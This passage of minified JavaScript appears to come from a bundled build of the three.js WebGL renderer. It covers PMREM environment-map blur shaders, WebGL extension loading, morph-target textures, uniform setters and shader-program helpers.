T=0;T<c.length;T++)c[T]=c[T]/g;p.envMap.value=e.texture,p.samples.value=f,p.weights.value=c,p.latitudinal.value=o==="latitudinal",a&&(p.poleAxis.value=a);const{_lodMax:_}=this;p.dTheta.value=E,p.mipInt.value=_-n;const v=this._sizeLods[r],w=3*v*(r>_-Xn?r-_+Xn:0),M=4*(this._cubeSize-v);Hi(t,w,M,3*v,2*v),l.setRenderTarget(t),l.render(h,Or)}}function ep(i){const e=[],t=[],n=[];let r=i;const s=i-Xn+1+va.length;for(let o=0;o<s;o++){const a=Math.pow(2,r);t.push(a);let l=1/a;o>i-Xn?l=va[o-i+Xn-1]:o===0&&(l=0),n.push(l);const d=1/(a-2),u=-d,h=1+d,p=[u,u,h,u,h,h,u,u,h,h,u,h],m=6,E=6,x=3,f=2,c=1,g=new Float32Array(x*E*m),_=new Float32Array(f*E*m),v=new Float32Array(c*E*m);for(let M=0;M<m;M++){const T=M%3*2/3-1,D=M>2?0:-1,y=[T,D,0,T+2/3,D,0,T+2/3,D+1,0,T,D,0,T+2/3,D+1,0,T,D+1,0];g.set(y,x*E*M),_.set(p,f*E*M);const R=[M,M,M,M,M,M];v.set(R,c*E*M)}const w=new It;w.setAttribute("position",new zt(g,x)),w.setAttribute("uv",new zt(_,f)),w.setAttribute("faceIndex",new zt(v,c)),e.push(w),r>Xn&&r--}return{lodPlanes:e,sizeLods:t,sigmas:n}}function Sa(i,e,t){const n=new Tn(i,e,t);return n.texture.mapping=tr,n.texture.name="PMREM.cubeUv",n.scissorTest=!0,n}function Hi(i,e,t,n,r){i.viewport.set(e,t,n,r),i.scissor.set(e,t,n,r)}function tp(i,e,t){const n=new Float32Array(xn),r=new L(0,1,0);return new An({name:"SphericalGaussianBlur",defines:{n:xn,CUBEUV_TEXEL_WIDTH:1/e,CUBEUV_TEXEL_HEIGHT:1/t,CUBEUV_MAX_MIP:`${i}.0`},uniforms:{envMap:{value:null},samples:{value:1},weights:{value:n},latitudinal:{value:!1},dTheta:{value:0},mipInt:{value:0},poleAxis:{value:r}},vertexShader:us(),fragmentShader:`

			precision mediump float;
			precision mediump int;

			varying vec3 vOutputDirection;

			uniform sampler2D envMap;
			uniform int samples;
			uniform float weights[ n ];
			uniform bool latitudinal;
			uniform float dTheta;
			uniform float mipInt;
			uniform vec3 poleAxis;

			#define ENVMAP_TYPE_CUBE_UV
			#include <cube_uv_reflection_fragment>

			vec3 getSample( float theta, vec3 axis ) {

				float cosTheta = cos( theta );
				// Rodrigues' axis-angle rotation
				vec3 sampleDirection = vOutputDirection * cosTheta
					+ cross( axis, vOutputDirection ) * sin( theta )
					+ axis * dot( axis, vOutputDirection ) * ( 1.0 - cosTheta );

				return bilinearCubeUV( envMap, sampleDirection, mipInt );

			}

			void main() {

				vec3 axis = latitudinal ? poleAxis : cross( poleAxis, vOutputDirection );

				if ( all( equal( axis, vec3( 0.0 ) ) ) ) {

					axis = vec3( vOutputDirection.z, 0.0, - vOutputDirection.x );

				}

				axis = normalize( axis );

				gl_FragColor = vec4( 0.0, 0.0, 0.0, 1.0 );
				gl_FragColor.rgb += weights[ 0 ] * getSample( 0.0, axis );

				for ( int i = 1; i < n; i++ ) {

					if ( i >= samples ) {

						break;

					}

					float theta = dTheta * float( i );
					gl_FragColor.rgb += weights[ i ] * getSample( -1.0 * theta, axis );
					gl_FragColor.rgb += weights[ i ] * getSample( theta, axis );

				}

			}
		`,blending:an,depthTest:!1,depthWrite:!1})}function Ma(){return new An({name:"EquirectangularToCubeUV",uniforms:{envMap:{value:null}},vertexShader:us(),fragmentShader:`

			precision mediump float;
			precision mediump int;

			varying vec3 vOutputDirection;

			uniform sampler2D envMap;

			#include <common>

			void main() {

				vec3 outputDirection = normalize( vOutputDirection );
				vec2 uv = equirectUv( outputDirection );

				gl_FragColor = vec4( texture2D ( envMap, uv ).rgb, 1.0 );

			}
		`,blending:an,depthTest:!1,depthWrite:!1})}function ba(){return new An({name:"CubemapToCubeUV",uniforms:{envMap:{value:null},flipEnvMap:{value:-1}},vertexShader:us(),fragmentShader:`

			precision mediump float;
			precision mediump int;

			uniform float flipEnvMap;

			varying vec3 vOutputDirection;

			uniform samplerCube envMap;

			void main() {

				gl_FragColor = textureCube( envMap, vec3( flipEnvMap * vOutputDirection.x, vOutputDirection.yz ) );

			}
		`,blending:an,depthTest:!1,depthWrite:!1})}function us(){return`

		precision mediump float;
		precision mediump int;

		attribute float faceIndex;

		varying vec3 vOutputDirection;

		// RH coordinate system; PMREM face-indexing convention
		vec3 getDirection( vec2 uv, float face ) {

			uv = 2.0 * uv - 1.0;

			vec3 direction = vec3( uv, 1.0 );

			if ( face == 0.0 ) {

				direction = direction.zyx; // ( 1, v, u ) pos x

			} else if ( face == 1.0 ) {

				direction = direction.xzy;
				direction.xz *= -1.0; // ( -u, 1, -v ) pos y

			} else if ( face == 2.0 ) {

				direction.x *= -1.0; // ( -u, v, 1 ) pos z

			} else if ( face == 3.0 ) {

				direction = direction.zyx;
				direction.xz *= -1.0; // ( -1, v, -u ) neg x

			} else if ( face == 4.0 ) {

				direction = direction.xzy;
				direction.xy *= -1.0; // ( -u, -1, v ) neg y

			} else if ( face == 5.0 ) {

				direction.z *= -1.0; // ( u, v, -1 ) neg z

			}

			return direction;

		}

		void main() {

			vOutputDirection = getDirection( uv, faceIndex );
			gl_Position = vec4( position, 1.0 );

		}
	`}function np(i){let e=new WeakMap,t=null;function n(a){if(a&&a.isTexture){const l=a.mapping,d=l===Kr||l===$r,u=l===Kn||l===$n;if(d||u)if(a.isRenderTargetTexture&&a.needsPMREMUpdate===!0){a.needsPMREMUpdate=!1;let h=e.get(a);return t===null&&(t=new ya(i)),h=d?t.fromEquirectangular(a,h):t.fromCubemap(a,h),e.set(a,h),h.texture}else{if(e.has(a))return e.get(a).texture;{const h=a.image;if(d&&h&&h.height>0||u&&h&&r(h)){t===null&&(t=new ya(i));const p=d?t.fromEquirectangular(a):t.fromCubemap(a);return e.set(a,p),a.addEventListener("dispose",s),p.texture}else return null}}}return a}function r(a){let l=0;const d=6;for(let u=0;u<d;u++)a[u]!==void 0&&l++;return l===d}function s(a){const l=a.target;l.removeEventListener("dispose",s);const d=e.get(l);d!==void 0&&(e.delete(l),d.dispose())}function o(){e=new WeakMap,t!==null&&(t.dispose(),t=null)}return{get:n,dispose:o}}function ip(i){const e={};function t(n){if(e[n]!==void 0)return e[n];let r;switch(n){case"WEBGL_depth_texture":r=i.getExtension("WEBGL_depth_texture")||i.getExtension("MOZ_WEBGL_depth_texture")||i.getExtension("WEBKIT_WEBGL_depth_texture");break;case"EXT_texture_filter_anisotropic":r=i.getExtension("EXT_texture_filter_anisotropic")||i.getExtension("MOZ_EXT_texture_filter_anisotropic")||i.getExtension("WEBKIT_EXT_texture_filter_anisotropic");break;case"WEBGL_compressed_texture_s3tc":r=i.getExtension("WEBGL_compressed_texture_s3tc")||i.getExtension("MOZ_WEBGL_compressed_texture_s3tc")||i.getExtension("WEBKIT_WEBGL_compressed_texture_s3tc");break;case"WEBGL_compressed_texture_pvrtc":r=i.getExtension("WEBGL_compressed_texture_pvrtc")||i.getExtension("WEBKIT_WEBGL_compressed_texture_pvrtc");break;default:r=i.getExtension(n)}return e[n]=r,r}return{has:function(n){return t(n)!==null},init:function(n){n.isWebGL2?(t("EXT_color_buffer_float"),t("WEBGL_clip_cull_distance")):(t("WEBGL_depth_texture"),t("OES_texture_float"),t("OES_texture_half_float"),t("OES_texture_half_float_linear"),t("OES_standard_derivatives"),t("OES_element_index_uint"),t("OES_vertex_array_object"),t("ANGLE_instanced_arrays")),t("OES_texture_float_linear"),t("EXT_color_buffer_half_float"),t("WEBGL_multisampled_render_to_texture")},get:function(n){const r=t(n);return r===null&&console.warn("THREE.WebGLRenderer: "+n+" extension not supported."),r}}}function rp(i,e,t,n){const r={},s=new WeakMap;function o(h){const p=h.target;p.index!==null&&e.remove(p.index);for(const E in p.attributes)e.remove(p.attributes[E]);for(const E in p.morphAttributes){const x=p.morphAttributes[E];for(let f=0,c=x.length;f<c;f++)e.remove(x[f])}p.removeEventListener("dispose",o),delete r[p.id];const m=s.get(p);m&&(e.remove(m),s.delete(p)),n.releaseStatesOfGeometry(p),p.isInstancedBufferGeometry===!0&&delete p._maxInstanceCount,t.memory.geometries--}function a(h,p){return r[p.id]===!0||(p.addEventListener("dispose",o),r[p.id]=!0,t.memory.geometries++),p}function l(h){const p=h.attributes;for(const E in p)e.update(p[E],i.ARRAY_BUFFER);const m=h.morphAttributes;for(const E in m){const x=m[E];for(let f=0,c=x.length;f<c;f++)e.update(x[f],i.ARRAY_BUFFER)}}function d(h){const p=[],m=h.index,E=h.attributes.position;let x=0;if(m!==null){const g=m.array;x=m.version;for(let _=0,v=g.length;_<v;_+=3){const w=g[_+0],M=g[_+1],T=g[_+2];p.push(w,M,M,T,T,w)}}else if(E!==void 0){const g=E.array;x=E.version;for(let _=0,v=g.length/3-1;_<v;_+=3){const w=_+0,M=_+1,T=_+2;p.push(w,M,M,T,T,w)}}else return;const f=new(fo(p)?xo:vo)(p,1);f.version=x;const c=s.get(h);c&&e.remove(c),s.set(h,f)}function u(h){const p=s.get(h);if(p){const m=h.index;m!==null&&p.version<m.version&&d(h)}else d(h);return s.get(h)}return{get:a,update:l,getWireframeAttribute:u}}function sp(i,e,t,n){const r=n.isWebGL2;let s;function o(m){s=m}let a,l;function d(m){a=m.type,l=m.bytesPerElement}function u(m,E){i.drawElements(s,E,a,m*l),t.update(E,s,1)}function h(m,E,x){if(x===0)return;let f,c;if(r)f=i,c="drawElementsInstanced";else if(f=e.get("ANGLE_instanced_arrays"),c="drawElementsInstancedANGLE",f===null){console.error("THREE.WebGLIndexedBufferRenderer: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.");return}f[c](s,E,a,m*l,x),t.update(E,s,x)}function p(m,E,x){if(x===0)return;const f=e.get("WEBGL_multi_draw");if(f===null)for(let c=0;c<x;c++)this.render(m[c]/l,E[c]);else{f.multiDrawElementsWEBGL(s,E,0,a,m,0,x);let c=0;for(let g=0;g<x;g++)c+=E[g];t.update(c,s,1)}}this.setMode=o,this.setIndex=d,this.render=u,this.renderInstances=h,this.renderMultiDraw=p}function ap(i){const e={geometries:0,textures:0},t={frame:0,calls:0,triangles:0,points:0,lines:0};function n(s,o,a){switch(t.calls++,o){case i.TRIANGLES:t.triangles+=a*(s/3);break;case i.LINES:t.lines+=a*(s/2);break;case i.LINE_STRIP:t.lines+=a*(s-1);break;case i.LINE_LOOP:t.lines+=a*s;break;case i.POINTS:t.points+=a*s;break;default:console.error("THREE.WebGLInfo: Unknown draw mode:",o);break}}function r(){t.calls=0,t.triangles=0,t.points=0,t.lines=0}return{memory:e,render:t,programs:null,autoReset:!0,reset:r,update:n}}function op(i,e){return i[0]-e[0]}function lp(i,e){return Math.abs(e[1])-Math.abs(i[1])}function cp(i,e,t){const n={},r=new Float32Array(8),s=new WeakMap,o=new ct,a=[];for(let d=0;d<8;d++)a[d]=[d,0];function l(d,u,h){const p=d.morphTargetInfluences;if(e.isWebGL2===!0){const E=u.morphAttributes.position||u.morphAttributes.normal||u.morphAttributes.color,x=E!==void 0?E.length:0;let f=s.get(u);if(f===void 0||f.count!==x){let z=function(){te.dispose(),s.delete(u),u.removeEventListener("dispose",z)};var m=z;f!==void 0&&f.texture.dispose();const _=u.morphAttributes.position!==void 0,v=u.morphAttributes.normal!==void 0,w=u.morphAttributes.color!==void 0,M=u.morphAttributes.position||[],T=u.morphAttributes.normal||[],D=u.morphAttributes.color||[];let y=0;_===!0&&(y=1),v===!0&&(y=2),w===!0&&(y=3);let R=u.attributes.position.count*y,k=1;R>e.maxTextureSize&&(k=Math.ceil(R/e.maxTextureSize),R=e.maxTextureSize);const X=new Float32Array(R*k*4*x),te=new _o(X,R,k,x);te.type=sn,te.needsUpdate=!0;const P=y*4;for(let W=0;W<x;W++){const Y=M[W],H=T[W],V=D[W],q=R*k*4*W;for(let Q=0;Q<Y.count;Q++){const $=Q*P;_===!0&&(o.fromBufferAttribute(Y,Q),X[q+$+0]=o.x,X[q+$+1]=o.y,X[q+$+2]=o.z,X[q+$+3]=0),v===!0&&(o.fromBufferAttribute(H,Q),X[q+$+4]=o.x,X[q+$+5]=o.y,X[q+$+6]=o.z,X[q+$+7]=0),w===!0&&(o.fromBufferAttribute(V,Q),X[q+$+8]=o.x,X[q+$+9]=o.y,X[q+$+10]=o.z,X[q+$+11]=V.itemSize===4?o.w:1)}}f={count:x,texture:te,size:new Be(R,k)},s.set(u,f),u.addEventListener("dispose",z)}let c=0;for(let _=0;_<p.length;_++)c+=p[_];const g=u.morphTargetsRelative?1:1-c;h.getUniforms().setValue(i,"morphTargetBaseInfluence",g),h.getUniforms().setValue(i,"morphTargetInfluences",p),h.getUniforms().setValue(i,"morphTargetsTexture",f.texture,t),h.getUniforms().setValue(i,"morphTargetsTextureSize",f.size)}else{const E=p===void 0?0:p.length;let x=n[u.id];if(x===void 0||x.length!==E){x=[];for(let v=0;v<E;v++)x[v]=[v,0];n[u.id]=x}for(let v=0;v<E;v++){const w=x[v];w[0]=v,w[1]=p[v]}x.sort(lp);for(let v=0;v<8;v++)v<E&&x[v][1]?(a[v][0]=x[v][0],a[v][1]=x[v][1]):(a[v][0]=Number.MAX_SAFE_INTEGER,a[v][1]=0);a.sort(op);const f=u.morphAttributes.position,c=u.morphAttributes.normal;let g=0;for(let v=0;v<8;v++){const w=a[v],M=w[0],T=w[1];M!==Number.MAX_SAFE_INTEGER&&T?(f&&u.getAttribute("morphTarget"+v)!==f[M]&&u.setAttribute("morphTarget"+v,f[M]),c&&u.getAttribute("morphNormal"+v)!==c[M]&&u.setAttribute("morphNormal"+v,c[M]),r[v]=T,g+=T):(f&&u.hasAttribute("morphTarget"+v)===!0&&u.deleteAttribute("morphTarget"+v),c&&u.hasAttribute("morphNormal"+v)===!0&&u.deleteAttribute("morphNormal"+v),r[v]=0)}const _=u.morphTargetsRelative?1:1-g;h.getUniforms().setValue(i,"morphTargetBaseInfluence",_),h.getUniforms().setValue(i,"morphTargetInfluences",r)}}return{update:l}}function dp(i,e,t,n){let r=new WeakMap;function s(l){const d=n.render.frame,u=l.geometry,h=e.get(l,u);if(r.get(h)!==d&&(e.update(h),r.set(h,d)),l.isInstancedMesh&&(l.hasEventListener("dispose",a)===!1&&l.addEventListener("dispose",a),r.get(l)!==d&&(t.update(l.instanceMatrix,i.ARRAY_BUFFER),l.instanceColor!==null&&t.update(l.instanceColor,i.ARRAY_BUFFER),r.set(l,d))),l.isSkinnedMesh){const p=l.skeleton;r.get(p)!==d&&(p.update(),r.set(p,d))}return h}function o(){r=new WeakMap}function a(l){const d=l.target;d.removeEventListener("dispose",a),t.remove(d.instanceMatrix),d.instanceColor!==null&&t.remove(d.instanceColor)}return{update:s,dispose:o}}class To extends Tt{constructor(e,t,n,r,s,o,a,l,d,u){if(u=u!==void 0?u:Sn,u!==Sn&&u!==Zn)throw new Error("DepthTexture format must be either THREE.DepthFormat or THREE.DepthStencilFormat");n===void 0&&u===Sn&&(n=rn),n===void 0&&u===Zn&&(n=yn),super(null,r,s,o,a,l,u,n,d),this.isDepthTexture=!0,this.image={width:e,height:t},this.magFilter=a!==void 0?a:gt,this.minFilter=l!==void 0?l:gt,this.flipY=!1,this.generateMipmaps=!1,this.compareFunction=null}copy(e){return super.copy(e),this.compareFunction=e.compareFunction,this}toJSON(e){const t=super.toJSON(e);return this.compareFunction!==null&&(t.compareFunction=this.compareFunction),t}}const Ao=new Tt,Ro=new To(1,1);Ro.compareFunction=po;const wo=new _o,Co=new Yl,Po=new So,Ta=[],Aa=[],Ra=new Float32Array(16),wa=new Float32Array(9),Ca=new Float32Array(4);function ti(i,e,t){const n=i[0];if(n<=0||n>0)return i;const r=e*t;let s=Ta[r];if(s===void 0&&(s=new Float32Array(r),Ta[r]=s),e!==0){n.toArray(s,0);for(let o=1,a=0;o!==e;++o)a+=t,i[o].toArray(s,a)}return s}function it(i,e){if(i.length!==e.length)return!1;for(let t=0,n=i.length;t<n;t++)if(i[t]!==e[t])return!1;return!0}function rt(i,e){for(let t=0,n=e.length;t<n;t++)i[t]=e[t]}function rr(i,e){let t=Aa[e];t===void 0&&(t=new Int32Array(e),Aa[e]=t);for(let n=0;n!==e;++n)t[n]=i.allocateTextureUnit();return t}function up(i,e){const t=this.cache;t[0]!==e&&(i.uniform1f(this.addr,e),t[0]=e)}function pp(i,e){const t=this.cache;if(e.x!==void 0)(t[0]!==e.x||t[1]!==e.y)&&(i.uniform2f(this.addr,e.x,e.y),t[0]=e.x,t[1]=e.y);else{if(it(t,e))return;i.uniform2fv(this.addr,e),rt(t,e)}}function fp(i,e){const t=this.cache;if(e.x!==void 0)(t[0]!==e.x||t[1]!==e.y||t[2]!==e.z)&&(i.uniform3f(this.addr,e.x,e.y,e.z),t[0]=e.x,t[1]=e.y,t[2]=e.z);else if(e.r!==void 0)(t[0]!==e.r||t[1]!==e.g||t[2]!==e.b)&&(i.uniform3f(this.addr,e.r,e.g,e.b),t[0]=e.r,t[1]=e.g,t[2]=e.b);else{if(it(t,e))return;i.uniform3fv(this.addr,e),rt(t,e)}}function hp(i,e){const t=this.cache;if(e.x!==void 0)(t[0]!==e.x||t[1]!==e.y||t[2]!==e.z||t[3]!==e.w)&&(i.uniform4f(this.addr,e.x,e.y,e.z,e.w),t[0]=e.x,t[1]=e.y,t[2]=e.z,t[3]=e.w);else{if(it(t,e))return;i.uniform4fv(this.addr,e),rt(t,e)}}function mp(i,e){const t=this.cache,n=e.elements;if(n===void 0){if(it(t,e))return;i.uniformMatrix2fv(this.addr,!1,e),rt(t,e)}else{if(it(t,n))return;Ca.set(n),i.uniformMatrix2fv(this.addr,!1,Ca),rt(t,n)}}function _p(i,e){const t=this.cache,n=e.elements;if(n===void 0){if(it(t,e))return;i.uniformMatrix3fv(this.addr,!1,e),rt(t,e)}else{if(it(t,n))return;wa.set(n),i.uniformMatrix3fv(this.addr,!1,wa),rt(t,n)}}function gp(i,e){const t=this.cache,n=e.elements;if(n===void 0){if(it(t,e))return;i.uniformMatrix4fv(this.addr,!1,e),rt(t,e)}else{if(it(t,n))return;Ra.set(n),i.uniformMatrix4fv(this.addr,!1,Ra),rt(t,n)}}function vp(i,e){const t=this.cache;t[0]!==e&&(i.uniform1i(this.addr,e),t[0]=e)}function xp(i,e){const t=this.cache;if(e.x!==void 0)(t[0]!==e.x||t[1]!==e.y)&&(i.uniform2i(this.addr,e.x,e.y),t[0]=e.x,t[1]=e.y);else{if(it(t,e))return;i.uniform2iv(this.addr,e),rt(t,e)}}function Ep(i,e){const t=this.cache;if(e.x!==void 0)(t[0]!==e.x||t[1]!==e.y||t[2]!==e.z)&&(i.uniform3i(this.addr,e.x,e.y,e.z),t[0]=e.x,t[1]=e.y,t[2]=e.z);else{if(it(t,e))return;i.uniform3iv(this.addr,e),rt(t,e)}}function yp(i,e){const t=this.cache;if(e.x!==void 0)(t[0]!==e.x||t[1]!==e.y||t[2]!==e.z||t[3]!==e.w)&&(i.uniform4i(this.addr,e.x,e.y,e.z,e.w),t[0]=e.x,t[1]=e.y,t[2]=e.z,t[3]=e.w);else{if(it(t,e))return;i.uniform4iv(this.addr,e),rt(t,e)}}function Sp(i,e){const t=this.cache;t[0]!==e&&(i.uniform1ui(this.addr,e),t[0]=e)}function Mp(i,e){const t=this.cache;if(e.x!==void 0)(t[0]!==e.x||t[1]!==e.y)&&(i.uniform2ui(this.addr,e.x,e.y),t[0]=e.x,t[1]=e.y);else{if(it(t,e))return;i.uniform2uiv(this.addr,e),rt(t,e)}}function bp(i,e){const t=this.cache;if(e.x!==void 0)(t[0]!==e.x||t[1]!==e.y||t[2]!==e.z)&&(i.uniform3ui(this.addr,e.x,e.y,e.z),t[0]=e.x,t[1]=e.y,t[2]=e.z);else{if(it(t,e))return;i.uniform3uiv(this.addr,e),rt(t,e)}}function Tp(i,e){const t=this.cache;if(e.x!==void 0)(t[0]!==e.x||t[1]!==e.y||t[2]!==e.z||t[3]!==e.w)&&(i.uniform4ui(this.addr,e.x,e.y,e.z,e.w),t[0]=e.x,t[1]=e.y,t[2]=e.z,t[3]=e.w);else{if(it(t,e))return;i.uniform4uiv(this.addr,e),rt(t,e)}}function Ap(i,e,t){const n=this.cache,r=t.allocateTextureUnit();n[0]!==r&&(i.uniform1i(this.addr,r),n[0]=r);const s=this.type===i.SAMPLER_2D_SHADOW?Ro:Ao;t.setTexture2D(e||s,r)}function Rp(i,e,t){const n=this.cache,r=t.allocateTextureUnit();n[0]!==r&&(i.uniform1i(this.addr,r),n[0]=r),t.setTexture3D(e||Co,r)}function wp(i,e,t){const n=this.cache,r=t.allocateTextureUnit();n[0]!==r&&(i.uniform1i(this.addr,r),n[0]=r),t.setTextureCube(e||Po,r)}function Cp(i,e,t){const n=this.cache,r=t.allocateTextureUnit();n[0]!==r&&(i.uniform1i(this.addr,r),n[0]=r),t.setTexture2DArray(e||wo,r)}function Pp(i){switch(i){case 5126:return up;case 35664:return pp;case 35665:return fp;case 35666:return hp;case 35674:return mp;case 35675:return _p;case 35676:return gp;case 5124:case 35670:return vp;case 35667:case 35671:return xp;case 35668:case 35672:return Ep;case 35669:case 35673:return yp;case 5125:return Sp;case 36294:return Mp;case 36295:return bp;case 36296:return Tp;case 35678:case 36198:case 36298:case 36306:case 35682:return Ap;case 35679:case 36299:case 36307:return Rp;case 35680:case 36300:case 36308:case 36293:return wp;case 36289:case 36303:case 36311:case 36292:return Cp}}function Ip(i,e){i.uniform1fv(this.addr,e)}function Lp(i,e){const t=ti(e,this.size,2);i.uniform2fv(this.addr,t)}function Dp(i,e){const t=ti(e,this.size,3);i.uniform3fv(this.addr,t)}function Np(i,e){const t=ti(e,this.size,4);i.uniform4fv(this.addr,t)}function Op(i,e){const t=ti(e,this.size,4);i.uniformMatrix2fv(this.addr,!1,t)}function Up(i,e){const t=ti(e,this.size,9);i.uniformMatrix3fv(this.addr,!1,t)}function Fp(i,e){const t=ti(e,this.size,16);i.uniformMatrix4fv(this.addr,!1,t)}function kp(i,e){i.uniform1iv(this.addr,e)}function zp(i,e){i.uniform2iv(this.addr,e)}function Bp(i,e){i.uniform3iv(this.addr,e)}function Gp(i,e){i.uniform4iv(this.addr,e)}function Hp(i,e){i.uniform1uiv(this.addr,e)}function Vp(i,e){i.uniform2uiv(this.addr,e)}function Wp(i,e){i.uniform3uiv(this.addr,e)}function Xp(i,e){i.uniform4uiv(this.addr,e)}function qp(i,e,t){const n=this.cache,r=e.length,s=rr(t,r);it(n,s)||(i.uniform1iv(this.addr,s),rt(n,s));for(let o=0;o!==r;++o)t.setTexture2D(e[o]||Ao,s[o])}function Yp(i,e,t){const n=this.cache,r=e.length,s=rr(t,r);it(n,s)||(i.uniform1iv(this.addr,s),rt(n,s));for(let o=0;o!==r;++o)t.setTexture3D(e[o]||Co,s[o])}function jp(i,e,t){const n=this.cache,r=e.length,s=rr(t,r);it(n,s)||(i.uniform1iv(this.addr,s),rt(n,s));for(let o=0;o!==r;++o)t.setTextureCube(e[o]||Po,s[o])}function Kp(i,e,t){const n=this.cache,r=e.length,s=rr(t,r);it(n,s)||(i.uniform1iv(this.addr,s),rt(n,s));for(let o=0;o!==r;++o)t.setTexture2DArray(e[o]||wo,s[o])}function $p(i){switch(i){case 5126:return Ip;case 35664:return Lp;case 35665:return Dp;case 35666:return Np;case 35674:return Op;case 35675:return Up;case 35676:return Fp;case 5124:case 35670:return kp;case 35667:case 35671:return zp;case 35668:case 35672:return Bp;case 35669:case 35673:return Gp;case 5125:return Hp;case 36294:return Vp;case 36295:return Wp;case 36296:return Xp;case 35678:case 36198:case 36298:case 36306:case 35682:return qp;case 35679:case 36299:case 36307:return Yp;case 35680:case 36300:case 36308:case 36293:return jp;case 36289:case 36303:case 36311:case 36292:return Kp}}class Zp{constructor(e,t,n){this.id=e,this.addr=n,this.cache=[],this.type=t.type,this.setValue=Pp(t.type)}}class Qp{constructor(e,t,n){this.id=e,this.addr=n,this.cache=[],this.type=t.type,this.size=t.size,this.setValue=$p(t.type)}}class Jp{constructor(e){this.id=e,this.seq=[],this.map={}}setValue(e,t,n){const r=this.seq;for(let s=0,o=r.length;s!==o;++s){const a=r[s];a.setValue(e,t[a.id],n)}}}const zr=/(\w+)(\])?(\[|\.)?/g;function Pa(i,e){i.seq.push(e),i.map[e.id]=e}function ef(i,e,t){const n=i.name,r=n.length;for(zr.lastIndex=0;;){const s=zr.exec(n),o=zr.lastIndex;let a=s[1];const l=s[2]==="]",d=s[3];if(l&&(a=a|0),d===void 0||d==="["&&o+2===r){Pa(t,d===void 0?new Zp(a,i,e):new Qp(a,i,e));break}else{let h=t.map[a];h===void 0&&(h=new Jp(a),Pa(t,h)),t=h}}}class qi{constructor(e,t){this.seq=[],this.map={};const n=e.getProgramParameter(t,e.ACTIVE_UNIFORMS);for(let r=0;r<n;++r){const s=e.getActiveUniform(t,r),o=e.getUniformLocation(t,s.name);ef(s,o,this)}}setValue(e,t,n,r){const s=this.map[t];s!==void 0&&s.setValue(e,n,r)}setOptional(e,t,n){const r=t[n];r!==void 0&&this.setValue(e,n,r)}static upload(e,t,n,r){for(let s=0,o=t.length;s!==o;++s){const a=t[s],l=n[a.id];l.needsUpdate!==!1&&a.setValue(e,l.value,r)}}static seqWithValue(e,t){const n=[];for(let r=0,s=e.length;r!==s;++r){const o=e[r];o.id in t&&n.push(o)}return n}}function Ia(i,e,t){const n=i.createShader(e);return i.shaderSource(n,t),i.compileShader(n),n}const tf=37297;let nf=0;function rf(i,e){const t=i.split(`
`),n=[],r=Math.max(e-6,0),s=Math.min(e+6,t.length);for(let o=r;o<s;o++){const a=o+1;n.push(`${a===e?">":" "} ${a}: ${t[o]}`)}return n.join(`
`)}function sf(i){const e=We.getPrimaries(We.workingColorSpace),t=We.getPrimaries(i);let n;switch(e===t?n="":e===$i&&t===Ki?n="LinearDisplayP3ToLinearSRGB":e===Ki&&t===$i&&(n="LinearSRGBToLinearDisplayP3"),i){case Zt:case nr:return[n,"LinearTransferOETF"];case lt:case os:return[n,"sRGBTransferOETF"];default:return console.warn("THREE.WebGLProgram: Unsupported color space:",i),[n,"LinearTransferOETF"]}}function La(i,e,t){const n=i.getShaderParameter(e,i.COMPILE_STATUS),r=i.getShaderInfoLog(e).trim();if(n&&r==="")return"";const s=/ERROR: 0:(\d+)/.exec(r);if(s){const o=parseInt(s[1]);return t.toUpperCase()+`

`+r+`

`+rf(i.getShaderSource(e),o)}else return r}function af(i,e){const t=sf(e);return`vec4 ${i}( vec4 value ) { return ${t[0]}( ${t[1]}( value ) ); }`}function of(i,e){let t;switch(e){case ml:t="Linear";break;case _l:t="Reinhard";break;case gl:t="OptimizedCineon";break;case vl:t="ACESFilmic";break;case El:t="AgX";break;case xl:t="Custom";break;default:console.warn("THREE.WebGLProgram: Unsupported toneMapping:",e),t="Linear"}return"vec3 "+i+"( vec3 color ) { return "+t+"ToneMapping( color ); }"}function lf(i){return[i.extensionDerivatives||i.envMapCubeUVHeight||i.bumpMap||i.normalMapTangentSpace||i.clearcoatNormalMap||i.flatShading||i.shaderID==="physical"?"#extension GL_OES_standard_derivatives : enable":"",(i.extensionFragDepth||i.logarithmicDepthBuffer)&&i.rendererExtensionFragDepth?"#extension GL_EXT_frag_depth : enable":"",i.extensionDrawBuffers&&i.rendererExtensionDrawBuffers?"#extension GL_EXT_draw_buffers : require":"",(i.extensionShaderTextureLOD||i.envMap||i.transmission)&&i.rendererExtensionShaderTextureLod?"#extension GL_EXT_shader_texture_lod : enable":""].filter(qn).join(`
`)}function cf(i){return[i.extensionClipCullDistance?"#extension GL_ANGLE_clip_cull_distance : require":""].filter(qn).join(`
`)}function df(i){const e=[];for(const t in i){const n=i[t];n!==!1&&e.push("#define "+t+" "+n)}return e.join(`
`)}function uf(i,e){const t={},n=i.getProgramParameter(e,i.ACTIVE_ATTRIBUTES);for(let r=0;r<n;r++){const s=i.getActiveAttrib(e,r),o=s.name;let a=1;s.type===i.FLOAT_MAT2&&(a=2),s.type===i.FLOAT_MAT3&&(a=3),s.type===i.FLOAT_MAT4&&(a=4),t[o]={type:s.type,location:i.getAttribLocation(e,o),locationSize:a}}return t}function qn(i){return i!==""}function Da(i,e){const t=e.numSpotLightShadows+e.numSpotLightMaps-e.numSpotLightShadowsWithMaps;return i.replace(/NUM_DIR_LIGHTS/g,e.numDirLights).replace(/NUM_SPOT_LIGHTS/g,e.numSpotLights).replace(/NUM_SPOT_LIGHT_MAPS/g,e.numSpotLightMaps).replace(/NUM_SPOT_LIGHT_COORDS/g,t).replace(/NUM_RECT_AREA_LIGHTS/g,e.numRectAreaLights).replace(/NUM_POINT_LIGHTS/g,e.numPointLights).replace(/NUM_HEMI_LIGHTS/g,e.numHemiLights).replace(/NUM_DIR_LIGHT_SHADOWS/g,e.numDirLightShadows).replace(/NUM_SPOT_LIGHT_SHADOWS_WITH_MAPS/g,e.numSpotLightShadowsWithMaps).replace(/NUM_SPOT_LIGHT_SHADOWS/g,e.numSpotLightShadows).replace(/NUM_POINT_LIGHT_SHADOWS/g,e.numPointLightShadows)}function Na(i,e){return i.replace(/NUM_CLIPPING_PLANES/g,e.numClippingPlanes).replace(/UNION_CLIPPING_PLANES/g,e.numClippingPlanes-e.numClipIntersection)}const pf=/^[ \t]*#include +<([\w\d./]+)>/gm;function ns(i){return i.replace(pf,hf)}const ff=new Map([["encodings_fragment","colorspace_fragment"],["encodings_pars_fragment","colorspace_pars_fragment"],["output_fragment","opaque_fragment"]]);function hf(i,e){let t=Ie[e];if(t===void 0){const n=ff.get(e);if(n!==void 0)t=Ie[n],console.warn('THREE.WebGLRenderer: Shader 